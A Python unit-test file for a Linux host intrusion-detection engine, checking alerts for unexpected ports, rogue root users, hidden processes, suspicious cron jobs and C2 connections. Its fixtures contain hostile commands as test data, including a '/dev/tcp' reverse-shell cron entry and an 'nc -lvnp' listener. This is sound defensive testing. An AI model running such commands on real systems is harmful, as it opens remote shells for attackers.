# Copyright (C) 2026 Musa Jaradat
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
import unittest
from pathlib import Path
from unittest.mock import patch, MagicMock, mock_open
from orin.core.database import OrinStorage
from orin.analysis.engine import run_analysis_cycle

class TestEngine(unittest.TestCase):
    exists_state = {"retval": False}

    def exists_mock(self):
        if isinstance(TestEngine.exists_state["retval"], bool):
            return TestEngine.exists_state["retval"]
        return TestEngine.exists_state["retval"](self)

    def setUp(self):
        self.unhide_patcher = patch("orin.analysis.engine.detect_hidden_processes", return_value=[])
        self.mock_detect_hidden = self.unhide_patcher.start()

        self.auth_logs_patcher = patch("orin.analysis.engine.parse_authentication_logs", return_value={"failed_ssh_counts": {}, "privileged_additions": []})
        self.mock_auth_logs = self.auth_logs_patcher.start()

        self.rootkit_patcher = patch("orin.analysis.engine.run_rootkit_detection", return_value={"indicators": []})
        self.mock_rootkit = self.rootkit_patcher.start()

        self.yara_patcher = patch("orin.analysis.engine.YARA_AVAILABLE", False)
        self.mock_yara = self.yara_patcher.start()

        self.db_path = Path("test_engine_unit.db")
        for suffix in ["", "-wal", "-shm"]:
            p = self.db_path.with_name(self.db_path.name + suffix)
            if p.exists():
                try:
                    p.unlink()
                except Exception:
                    pass
        self.storage = OrinStorage(self.db_path)
        self.storage.initialize_db()

        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = [row[0] for row in cursor.fetchall()]
            for table in tables:
                if not table.startswith("sqlite_"):
                    conn.execute(f"DELETE FROM {table};")
            conn.execute(
                "INSERT INTO baseline_users (hostname, username, uid, gid) VALUES ('debian', 'root', 0, 0);"
            )
            conn.commit()

    def tearDown(self):
        self.unhide_patcher.stop()
        self.auth_logs_patcher.stop()
        self.rootkit_patcher.stop()
        self.yara_patcher.stop()
        if hasattr(self, 'storage'):
            self.storage.cleanup_db()

    @patch("orin.analysis.engine.load_config")
    def test_port_whitelisting(self, mock_load_config):
        mock_load_config.return_value = {
            "expected_ports": [22],
            "whitelisted_processes": ["code", "antigravity-ide"],
            "critical_paths": [],
            "critical_dirs": []
        }

        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 22, 'TCP', 'sshd');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 35415, 'TCP', 'antigravity-ide (PID: 7374)');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 9999, 'TCP', 'malicious (PID: 666)');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 555, 'TCP', 'code (PID: 999)');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT description FROM security_events WHERE event_type = 'unexpected_port';")
            events = [row["description"] for row in cursor.fetchall()]

            self.assertEqual(len(events), 2)
            self.assertTrue(any("9999" in ev for ev in events))
            self.assertTrue(any("555" in ev for ev in events))
            self.assertFalse(any("35415" in ev for ev in events))
            self.assertFalse(any("22" in ev for ev in events))

    @patch("orin.analysis.engine.load_config")
    def test_auto_resolution(self, mock_load_config):
        mock_load_config.return_value = {
            "expected_ports": [22],
            "whitelisted_processes": ["code"],
            "critical_paths": [],
            "critical_dirs": []
        }

        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 9999, 'TCP', 'malicious (PID: 666)');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT resolved FROM security_events WHERE event_type = 'unexpected_port' AND description LIKE '%9999%';")
            self.assertEqual(cursor.fetchone()["resolved"], 0)

        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (2, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT resolved FROM security_events WHERE event_type = 'unexpected_port' AND description LIKE '%9999%';")
            self.assertEqual(cursor.fetchone()["resolved"], 1)

    @patch("orin.analysis.engine.load_config")
    def test_risk_score_calculation(self, mock_load_config):
        """Verify the Severity-Tiered Risk Scoring Model calculations."""
        # 1. Zero events -> score 0
        mock_load_config.return_value = {
            "expected_ports": [22],
            "whitelisted_processes": [],
            "critical_paths": [],
            "critical_dirs": []
        }
        with self.storage.get_connection() as conn:
            # Clean up snapshots and events first
            conn.execute("DELETE FROM collected_ports;")
            conn.execute("DELETE FROM system_snapshots;")
            conn.execute("DELETE FROM security_events;")
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
            # Only expected port, no anomalies
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (1, 22, 'TCP', 'sshd');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'root', 0, 0);")
            conn.commit()

        res = run_analysis_cycle(self.db_path)
        if res["events_count"] != 0:
            with self.storage.get_connection() as conn:
                cursor = conn.cursor()
                cursor.execute("SELECT event_type, description FROM security_events;")
                print("\nDEBUG: Found unexpected events:", cursor.fetchall())
        self.assertEqual(res["events_count"], 0)
        self.assertEqual(res["risk_score"], 0)

        # 2. A single medium event (unexpected port) -> score 35
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (2, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (2, 22, 'TCP', 'sshd');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (2, 9999, 'TCP', 'malicious');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'root', 0, 0);")
            conn.commit()

        res = run_analysis_cycle(self.db_path)
        self.assertEqual(res["events_count"], 1)
        self.assertEqual(res["risk_score"], 35)

        # 3. 10 medium events (10 unexpected ports) -> score capped at 49 (35 + 9 * 1.5 = 48.5 -> 49)
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (3, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (3, 22, 'TCP', 'sshd');")
            for p in range(9000, 9010): # 10 ports
                conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (3, ?, 'TCP', 'malicious');", (p,))
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (3, 'root', 0, 0);")
            conn.commit()

        res = run_analysis_cycle(self.db_path)
        self.assertEqual(res["events_count"], 10)
        self.assertEqual(res["risk_score"], 49) # 35 + 9 * 1.5 = 48.5, rounded to 49

        # 4. Critical event present (e.g. unauthorized user profile created with UID 0) -> score starts at 90
        with self.storage.get_connection() as conn:
            # Let's clear users baseline to trigger unauthorized user created
            conn.execute("DELETE FROM baseline_users;")
            # Snapshot 4
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (4, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (4, 22, 'TCP', 'sshd');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (4, 'attacker', 0, 0);")
            conn.commit()

        res = run_analysis_cycle(self.db_path)
        self.assertEqual(res["risk_score"], 90)

    @patch("orin.analysis.engine.load_config")
    def test_forensic_auto_resolution(self, mock_load_config):
        mock_load_config.return_value = {
            "expected_ports": [22],
            "whitelisted_processes": [],
            "critical_paths": [],
            "critical_dirs": []
        }

        # Setup baseline users
        with self.storage.get_connection() as conn:
            conn.execute("INSERT OR REPLACE INTO baseline_users (hostname, username, uid, gid) VALUES ('debian', 'musa', 1000, 1000);")
            conn.commit()

        # Step 1: Insert snapshot 1 with all kinds of forensic anomalies
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
            # 1. deleted_binary_execution
            conn.execute("INSERT INTO collected_deleted_binaries (snapshot_id, pid, exe, sha256, md5, vault_path) VALUES (1, 9999, '/usr/bin/evil', 'sha', 'md5', '/vault/path');")
            # 2. promiscuous_interface
            conn.execute("INSERT INTO collected_promisc_interfaces (snapshot_id, interface, flags, is_promiscuous) VALUES (1, 'eth0', '0x100', 1);")
            # 3. pkg_integrity_violation
            conn.execute("INSERT INTO collected_pkg_integrity (snapshot_id, package, file_path, expected_md5, actual_md5, actual_sha256, status) VALUES (1, 'sudo', '/usr/bin/sudo', 'abc', 'def', 'xyz', 'modified');")
            # 4. unauthorized_user_created
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'eviluser', 1001, 1001);")
            # 5. privilege_escalation_hijack
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'musa', 0, 1000);")
            # 6. suspicious_process_ancestry
            conn.execute("INSERT INTO collected_processes (snapshot_id, pid, ppid, name, exe, cmdline) VALUES (1, 8888, 1, 'xmrig', '/tmp/xmrig', '/tmp/xmrig');")
            # 7. hidden_process (via mock)
            self.mock_detect_hidden.return_value = [{"pid": 7777, "status": "hidden", "reason": "Process responds to signal 0 but is not present in /proc"}]
            conn.commit()

        # Run analysis for snapshot 1 to trigger insertion of security events
        run_analysis_cycle(self.db_path)

        # Verify that all events are present and unresolved (resolved = 0)
        expected_types = [
            "deleted_binary_execution",
            "promiscuous_interface",
            "pkg_integrity_violation",
            "unauthorized_user_created",
            "privilege_escalation_hijack",
            "suspicious_process_ancestry",
            "hidden_process"
        ]
        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            for et in expected_types:
                cursor.execute("SELECT resolved FROM security_events WHERE event_type = ?;", (et,))
                rows = cursor.fetchall()
                self.assertGreater(len(rows), 0, f"Expected event of type {et} to be created")
                for r in rows:
                    self.assertEqual(r["resolved"], 0, f"Event {et} should be unresolved initially")

        # Step 2: Insert snapshot 2 where all anomalies have been resolved
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (2, 'debian', 'Linux');")
            # Clear or set standard normal state records for snapshot 2
            # Normal users (eviluser deleted, musa restored to uid 1000)
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'musa', 1000, 1000);")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'root', 0, 0);")
            # No suspicious processes
            conn.execute("INSERT INTO collected_processes (snapshot_id, pid, ppid, name, exe, cmdline) VALUES (2, 100, 1, 'systemd', '/usr/lib/systemd/systemd', '');")
            # No hidden processes
            self.mock_detect_hidden.return_value = []
            conn.commit()

        # Run analysis for snapshot 2 to trigger auto-resolution
        run_analysis_cycle(self.db_path)

        # Verify that all events have been marked as resolved (resolved = 1)
        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            for et in expected_types:
                cursor.execute("SELECT resolved FROM security_events WHERE event_type = ?;", (et,))
                rows = cursor.fetchall()
                self.assertGreater(len(rows), 0, f"Expected event of type {et} to persist in ledger")
                for r in rows:
                    self.assertEqual(r["resolved"], 1, f"Expected event {et} to be auto-resolved")

    @patch("orin.analysis.engine.load_config")
    def test_cron_rules_and_resolution(self, mock_load_config):
        mock_load_config.return_value = {
            "expected_ports": [22],
            "whitelisted_processes": [],
            "critical_paths": [],
            "critical_dirs": []
        }

        # Step 1: Snapshot 1 with a benign cron
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (1, '/etc/crontab', 'root', '17 * * * *', 'run-parts /etc/cron.hourly');"
            )
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (1, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        # Verify no cron events in snapshot 1
        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT event_type FROM security_events WHERE event_type LIKE 'cron%' OR event_type = 'new_cron_job';")
            self.assertEqual(len(cursor.fetchall()), 0)

        # Step 2: Snapshot 2 with new crons (volatile execution, suspicious command, and drift)
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (2, 'debian', 'Linux');")
            # Benign cron remains
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (2, '/etc/crontab', 'root', '17 * * * *', 'run-parts /etc/cron.hourly');"
            )
            # Volatile cron added
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (2, '/var/spool/cron/crontabs/alice', 'alice', '* * * * *', '/tmp/backup.sh');"
            )
            # Suspicious cron command added
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (2, '/etc/cron.d/shell', 'root', '* * * * *', 'bash -i >& /dev/tcp/1.1.1.1/4444');"
            )
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        # Verify alerts triggered
        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT event_type, resolved FROM security_events WHERE resolved = 0;")
            events = cursor.fetchall()
            event_types = [e["event_type"] for e in events]

            self.assertEqual(len(events), 4)
            self.assertEqual(event_types.count("new_cron_job"), 2)
            self.assertEqual(event_types.count("cron_volatile_execution"), 1)
            self.assertEqual(event_types.count("cron_suspicious_command"), 1)

        # Step 3: Snapshot 3 with volatile & suspicious crons removed
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (3, 'debian', 'Linux');")
            # Benign cron remains
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (3, '/etc/crontab', 'root', '17 * * * *', 'run-parts /etc/cron.hourly');"
            )
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (3, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        # Verify all those alerts are now resolved
        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT event_type, resolved FROM security_events WHERE event_type IN ('new_cron_job', 'cron_volatile_execution', 'cron_suspicious_command');")
            events = cursor.fetchall()
            self.assertEqual(len(events), 4)
            for e in events:
                self.assertEqual(e["resolved"], 1, f"Expected event {e['event_type']} to be auto-resolved")

    @patch("orin.analysis.engine.load_offline_intel_blocklist")
    @patch("orin.analysis.engine.parse_authentication_logs")
    def test_engine_remaining_coverage(self, mock_auth_logs, mock_blocklist):
        mock_blocklist.return_value = ({"1.2.3.4"}, None)
        mock_auth_logs.return_value = {
            "failed_ssh_counts": {"5.6.7.8": 10},
            "privileged_additions": [{"type": "new_user", "details": "New local system account created"}]
        }

        # Setup snapshot 1 and 2
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (2, 'debian', 'Linux');")

            # File modification
            conn.execute("INSERT INTO collected_file_hashes (snapshot_id, file_path, sha256_hash, mtime, ctime, size) VALUES (1, '/etc/hosts', 'abc', 0, 0, 0);")
            conn.execute("INSERT INTO collected_file_hashes (snapshot_id, file_path, sha256_hash, mtime, ctime, size) VALUES (2, '/etc/hosts', 'def', 0, 0, 0);")

            # Outbound C2
            conn.execute("INSERT INTO collected_outbound_connections (snapshot_id, local_ip, remote_ip, remote_port, process_name) VALUES (2, '10.0.0.1', '1.2.3.4', 443, 'malicious');")

            # Kernel thread PPID masquerade
            conn.execute("INSERT INTO collected_processes (snapshot_id, pid, ppid, name, exe, cmdline) VALUES (2, 9999, 500, 'kworker/0:1', '/lib/kworker', '');")

            # New SSH key
            conn.execute("INSERT INTO collected_ssh_keys (snapshot_id, user_account, key_type, fingerprint, raw_key_comment) VALUES (2, 'root', 'ssh-rsa', 'fp123', 'root key');")

            # Untrusted kernel module
            conn.execute("INSERT INTO baseline_kernel_modules (hostname, module_name, memory_size) VALUES ('debian', 'ext4', 1000);")
            conn.execute("INSERT INTO collected_kernel_modules (snapshot_id, module_name, memory_size, instances_loaded) VALUES (2, 'untrusted_mod', 2000, 1);")

            # Add root user
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'root', 0, 0);")
            conn.commit()

        res = run_analysis_cycle(self.db_path)
        self.assertGreater(res["events_count"], 0)

        # Verify the security events in the DB
        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT event_type FROM security_events WHERE resolved = 0;")
            event_types = {row["event_type"] for row in cursor.fetchall()}

            expected = {
                "outbound_c2_communication",
                "suspicious_process_ancestry",
                "file_modification",
                "new_ssh_authorized_key",
                "ssh_bruteforce",
                "new_user",
                "untrusted_kernel_module"
            }
            for exp in expected:
                self.assertIn(exp, event_types)

    @patch("orin.analysis.engine.load_offline_intel_blocklist")
    @patch("orin.analysis.engine.parse_authentication_logs")
    def test_engine_more_scenarios(self, mock_auth_logs, mock_blocklist):
        mock_blocklist.return_value = (set(), None)
        mock_auth_logs.return_value = {
            "failed_ssh_counts": {},
            "privileged_additions": []
        }

        # Setup snapshot 1 and 2
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (1, 'debian', 'Linux');")
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (2, 'debian', 'Linux');")

            # Package integrity with missing status
            conn.execute(
                "INSERT INTO collected_pkg_integrity (snapshot_id, package, file_path, expected_md5, actual_md5, actual_sha256, status) "
                "VALUES (2, 'sudo', '/usr/bin/sudo', 'abc', 'def', 'xyz', 'missing');"
            )

            # Volatile and suspicious cron jobs
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (2, '/etc/crontab', 'root', '* * * * *', '/tmp/malicious.sh');"
            )
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (2, '/etc/crontab', 'root', '* * * * *', 'nc -lvnp 4444');"
            )

            # Setup suppressed events in the ledger so they are skipped (line 375)
            # Event type unexpected_port description with suppressed=1
            conn.execute(
                "INSERT INTO security_events (event_type, severity, description, suppressed, resolved) "
                "VALUES ('unexpected_port', 'medium', 'Unexpected listening network port detected: 9999', 1, 0);"
            )

            # Setup severity override to 'low' (line 384)
            # Event type unexpected_port description with severity override
            conn.execute(
                "INSERT INTO security_events (event_type, severity, description, suppressed, resolved) "
                "VALUES ('unexpected_port', 'low', 'Unexpected listening network port detected: 8888', 0, 0);"
            )

            # Add these ports to trigger them
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (2, 9999, 'TCP', 'malicious');")
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (2, 8888, 'TCP', 'malicious');")

            # Setup processes matching Rules C (cmdline) & D (volatile path)
            conn.execute("INSERT INTO collected_processes (snapshot_id, pid, ppid, name, exe, cmdline) VALUES (2, 201, 100, 'sh', '/bin/sh', 'bash -i');")
            conn.execute("INSERT INTO collected_processes (snapshot_id, pid, ppid, name, exe, cmdline) VALUES (2, 202, 100, 'evil', '/tmp/evil', 'evil');")

            # Setup malformed JSON events for exceptions (lines 405, 425, 436, 456, 485, 501)
            conn.execute(
                "INSERT INTO security_events (event_type, severity, description, resolved, raw_details) "
                "VALUES ('unexpected_port', 'medium', 'Old port', 0, '{invalid_json');"
            )
            conn.execute(
                "INSERT INTO security_events (event_type, severity, description, resolved, raw_details) "
                "VALUES ('hidden_process', 'critical', 'Old hidden', 0, '{invalid_json');"
            )
            conn.execute(
                "INSERT INTO security_events (event_type, severity, description, resolved, raw_details) "
                "VALUES ('deleted_binary_execution', 'critical', 'Old deleted', 0, '{invalid_json');"
            )
            conn.execute(
                "INSERT INTO security_events (event_type, severity, description, resolved, raw_details) "
                "VALUES ('pkg_integrity_violation', 'critical', 'Old pkg', 0, '{invalid_json');"
            )
            conn.execute(
                "INSERT INTO security_events (event_type, severity, description, resolved, raw_details) "
                "VALUES ('suspicious_process_ancestry', 'high', 'Old process', 0, '{invalid_json');"
            )
            conn.execute(
                "INSERT INTO security_events (event_type, severity, description, resolved, raw_details) "
                "VALUES ('new_cron_job', 'high', 'Old cron', 0, '{invalid_json');"
            )

            # Setup WTMP and Lastlog anomalies (lines 294, 304)
            conn.execute(
                "INSERT INTO collected_wtmp_sessions (snapshot_id, user, line, host, pid, login_time, logout_time, anomaly_detected, anomaly_reason) "
                "VALUES (2, 'attacker', 'pts/0', '1.1.1.1', 123, '2026-06-04T09:00:00Z', '', 1, 'WTMP modified');"
            )
            conn.execute(
                "INSERT INTO collected_lastlog_records (snapshot_id, username, uid, line, host, login_time, anomaly_detected, anomaly_reason) "
                "VALUES (2, 'attacker', 1000, 'pts/0', '1.1.1.1', '2026-06-04T09:00:00Z', 1, 'Lastlog modified');"
            )

            # Add root user
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (2, 'root', 0, 0);")
            conn.commit()

        res = run_analysis_cycle(self.db_path)
        self.assertGreater(res["events_count"], 0)
        # Risk score should match low/medium calculation
        self.assertGreater(res["risk_score"], 0)

        # Now test auto-resolve for untrusted kernel modules (line 415)
        # 1. Insert untrusted_kernel_module event for untrusted_mod in db
        with self.storage.get_connection() as conn:
            conn.execute(
                "INSERT INTO security_events (event_type, severity, description, resolved) "
                "VALUES ('untrusted_kernel_module', 'critical', 'CRITICAL: Untrusted or unsigned LKM kernel driver module detected: untrusted_mod', 0);"
            )
            # Insert snapshot 3 with NO untrusted modules
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (3, 'debian', 'Linux');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (3, 'root', 0, 0);")
            conn.commit()

        res3 = run_analysis_cycle(self.db_path)

        # Verify untrusted_mod was resolved (resolved = 1)
        with self.storage.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT resolved FROM security_events WHERE event_type = 'untrusted_kernel_module' AND description LIKE '%untrusted_mod%';")
            self.assertEqual(cursor.fetchone()["resolved"], 1)

        # -------------------------------------------------------------
        # Test Case: High severity events only, no critical (line 518)
        # -------------------------------------------------------------
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (4, 'debian', 'Linux');")
            # Volatile cron -> high severity event
            conn.execute(
                "INSERT INTO collected_crontabs (snapshot_id, source, user, schedule, command) "
                "VALUES (4, '/etc/crontab', 'root', '* * * * *', '/tmp/malicious.sh');"
            )
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (4, 'root', 0, 0);")
            conn.commit()

        res4 = run_analysis_cycle(self.db_path)
        # Assert risk score is high but capped at 89 (line 518)
        self.assertTrue(65 <= res4["risk_score"] <= 89)

        # -------------------------------------------------------------
        # Test Case: Low severity events only (line 522)
        # -------------------------------------------------------------
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (5, 'debian', 'Linux');")
            # We already have a severity override to 'low' for unexpected port 8888
            # Add port 8888 to trigger unexpected_port
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (5, 8888, 'TCP', 'malicious');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (5, 'root', 0, 0);")
            conn.commit()

        res5 = run_analysis_cycle(self.db_path)
        # Assert risk score is low (line 522)
        self.assertTrue(15 <= res5["risk_score"] <= 34)

    @patch("pathlib.Path.exists", new=exists_mock)
    @patch("builtins.open", new_callable=mock_open)
    def test_load_offline_intel_blocklist_errors_and_comments(self, mock_file_open):
        from orin.analysis.engine import load_offline_intel_blocklist

        # Scenario 1: Path doesn't exist (returns tuple now)
        TestEngine.exists_state["retval"] = False
        res, importer = load_offline_intel_blocklist()
        self.assertEqual(res, set())
        self.assertIsNone(importer)

        # Scenario 2: Exception on read
        TestEngine.exists_state["retval"] = True
        mock_file_open.side_effect = OSError("Read failed")
        res, importer = load_offline_intel_blocklist()
        self.assertEqual(res, set())
        self.assertIsNone(importer)

        # Scenario 3: Skip comment and empty lines
        from orin.analysis.engine import INTEL_DIR_PATH, BLOCKLIST_FILE_PATH
        def exists_side_effect(path):
            if str(path) == str(INTEL_DIR_PATH):
                return False
            if str(path) == str(BLOCKLIST_FILE_PATH):
                return True
            return False
        TestEngine.exists_state["retval"] = exists_side_effect
        mock_file_open.side_effect = None
        mock_file_open.return_value = mock_open(read_data="# comment\n\n1.2.3.4\n").return_value
        res, importer = load_offline_intel_blocklist()
        self.assertEqual(res, {"1.2.3.4"})
        self.assertIsNone(importer)  # Legacy mode

    @patch("orin.analysis.engine.load_config")
    def test_engine_attck_tagging(self, mock_load_config):
        mock_load_config.return_value = {
            "expected_ports": [],
            "whitelisted_processes": [],
            "critical_paths": [],
            "critical_dirs": []
        }
        with self.storage.get_connection() as conn:
            conn.execute("INSERT INTO system_snapshots (id, hostname, os_platform) VALUES (10, 'debian', 'Linux');")
            # Unexpected port 80 to trigger an alert
            conn.execute("INSERT INTO collected_ports (snapshot_id, port, protocol, process_name) VALUES (10, 80, 'TCP', 'nginx');")
            # Volatile dir process to trigger suspicious process ancestry (masquerade)
            conn.execute("INSERT INTO collected_processes (snapshot_id, pid, ppid, name, exe, cmdline) VALUES (10, 100, 50, 'kworker/0:1', '/lib/kworker', '');")
            conn.execute("INSERT INTO collected_users (snapshot_id, username, uid, gid) VALUES (10, 'root', 0, 0);")
            conn.commit()

        run_analysis_cycle(self.db_path)

        with self.storage.get_connection() as conn:
            cursor = conn.cursor()

            # Check port alert ATT&CK tagging
            cursor.execute("SELECT attck_technique, attck_tactic, attck_url FROM security_events WHERE event_type = 'unexpected_port';")
            row = cursor.fetchone()
            self.assertEqual(row["attck_technique"], "T1571")
            self.assertEqual(row["attck_tactic"], "Command and Control")
            self.assertEqual(row["attck_url"], "https://attack.mitre.org/techniques/T1571/")

            # Check process alert ATT&CK tagging (masquerade)
            cursor.execute("SELECT attck_technique, attck_tactic, attck_url FROM security_events WHERE event_type = 'suspicious_process_ancestry';")
            row = cursor.fetchone()
            self.assertEqual(row["attck_technique"], "T1036.004")
            self.assertEqual(row["attck_tactic"], "Defense Evasion")

if __name__ == "__main__":
    unittest.main()